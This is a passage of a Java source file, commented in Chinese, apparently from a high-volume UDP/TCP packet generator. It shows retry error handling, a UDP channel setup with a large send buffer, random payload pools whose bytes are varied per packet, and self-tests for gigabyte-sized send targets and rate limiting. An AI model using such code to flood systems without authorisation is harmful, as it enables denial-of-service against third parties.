            } catch (java.nio.channels.AsynchronousCloseException e) {
                // 通道被异步关闭；视为中断
                return SendResult.INTERRUPTED;
            } catch (PortUnreachableException e) {
                if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
                stats.recordError("port_unreach", tag, target.toString());
            } catch (IOException e) {
                if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
                stats.recordError("io", tag, e.getMessage());
            } catch (Exception e) {
                if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
                stats.recordError("other", tag, e.getClass().getSimpleName()
                        + " (" + e.getMessage() + ")");
            }
            attempt++;
        }
        return SendResult.FAILED;
    }

    // ==================== UDP 通道 ====================
    static DatagramChannel openUdpChannel(InetAddress bindAddr, int bindPort,
                                            String tag, Stats stats) throws IOException {
        DatagramChannel channel = DatagramChannel.open();
        channel.configureBlocking(true);
        DatagramSocket socket = channel.socket();
        try {
            socket.setReuseAddress(true);
            try { socket.setSendBufferSize(4 * 1024 * 1024); }
            catch (SocketException ignored) { }
        } catch (SocketException ignored) { }
        if (bindAddr != null || bindPort > 0) {
            try {
                InetAddress addr = bindAddr != null ? bindAddr : InetAddress.getByName("0.0.0.0");
                socket.bind(new InetSocketAddress(addr, bindPort));
            } catch (BindException e) {
                stats.recordError("bind", tag, bindAddr + ":" + bindPort + " - " + e.getMessage());
            }
        }
        return channel;
    }

    // ==================== 载荷辅助 ====================
    static List<byte[]> buildVariantPool(int baseSize, int poolSize, boolean vary, Random rnd) {
        List<byte[]> pool = new ArrayList<>(poolSize);
        if (!vary) {
            byte[] one = new byte[baseSize];
            rnd.nextBytes(one);
            pool.add(one);
            return pool;
        }
        int delta = Math.max(1, baseSize / 10);
        for (int i = 0; i < poolSize; i++) {
            int len = baseSize - delta + rnd.nextInt(delta * 2 + 1);
            if (len < MIN_PAYLOAD) len = MIN_PAYLOAD;
            if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
            byte[] p = new byte[len];
            rnd.nextBytes(p);
            pool.add(p);
        }
        return pool;
    }

    static void mutatePayload(byte[] payload, long counter, Random rnd) {
        int n = payload.length;
        if (n >= 8) {
            long c = counter;
            for (int b = 0; b < 8; b++) {
                payload[n - 1 - b] = (byte)(c & 0xFF);
                c >>>= 8;
            }
        }
        if (n >= 24) {
            for (int b = 0; b < 16; b++) {
                int idx = 4 + b;
                payload[idx] ^= (byte) rnd.nextInt(256);
            }
        }
    }

    // ==================== 自检 ====================
    static boolean runSelfTest() {
        System.out.println("[selftest] 运行中...");
        int failed = 0;

        // --- 测试 1：finalizeConfig 包大小上下边界 clamp ---
        Config c = new Config();
        c.packetSize = 1;
        c.gb = 1.0;
        c.useTcp = false;
        finalizeConfig(c);
        if (c.packetSize != MIN_PAYLOAD) { failed++; System.err.println("FAIL: 包大小下限 clamp"); }

        c = new Config();
        c.packetSize = 999_999;
        c.gb = 1.0;
        finalizeConfig(c);
        if (c.packetSize != MAX_PAYLOAD) { failed++; System.err.println("FAIL: 包大小上限 clamp"); }

        // --- 测试 2：totalPackets 使用 wire 大小 ---
        c = new Config();
        c.packetSize = 100;
        c.gb = 1.0;
        c.useTcp = false;
        finalizeConfig(c);
        long expected = (long)(1L * 1024 * 1024 * 1024) / (100 + IP_HEADER_LEN + UDP_HEADER_LEN);
        if (c.totalPackets != expected) {
            failed++; System.err.println("FAIL: totalPackets 计算，得到 " + c.totalPackets + " 期望 " + expected);
        }

        // --- 测试 3：isValue 处理负数 ---
        if (!isValue("-1", "-s")) { failed++; System.err.println("FAIL: -s -1 应可解析"); }
        if (isValue("-foo", "-s")) { failed++; System.err.println("FAIL: -s -foo 应被拒绝"); }
        if (isValue("-1", "--log")) { failed++; System.err.println("FAIL: --log -1 应被拒绝"); }
        if (!isValue("regular", "--log")) { failed++; System.err.println("FAIL: --log regular 应被接受"); }

        // --- 测试 4：CAS 严格 attempts 上限 ---
        Stats s = new Stats();
        int reserved = 0;
        for (int i = 0; i < 1000; i++) {
            if (s.reserveAttempt(100)) reserved++;
        }
        if (reserved != 100) { failed++; System.err.println("FAIL: reserveAttempt 封顶，得到 " + reserved); }
        if (s.attempts.get() != 100) { failed++; System.err.println("FAIL: attempts != 100"); }

        // --- 测试 5：极端 rateLimit 下 GlobalRateLimiter ---
        // 不实际等待；只验证不抛异常
        try {
            GlobalRateLimiter g = new GlobalRateLimiter(1_000_000.0, 50);
            if (g.tokensPerSecond <= 0) { failed++; System.err.println("FAIL: tokensPerSecond <= 0"); }
        } catch (Exception e) {
            failed++; System.err.println("FAIL: GlobalRateLimiter 构造: " + e.getMessage());
        }

        // --- 测试 6：载荷池长度在边界内 ---
        Random rnd = new Random(42);
        List<byte[]> pool = buildVariantPool(1000, 10, true, rnd);
        for (byte[] p : pool) {
            if (p.length < MIN_PAYLOAD || p.length > MAX_PAYLOAD) {
                failed++; System.err.println("FAIL: 载荷越界: " + p.length);
                break;
            }
        }

        if (failed == 0) {
            System.out.println("[selftest] 全部测试通过");
            return true;
        }
        System.err.println("[selftest] " + failed + " 个测试失败");
        return false;
    }
}
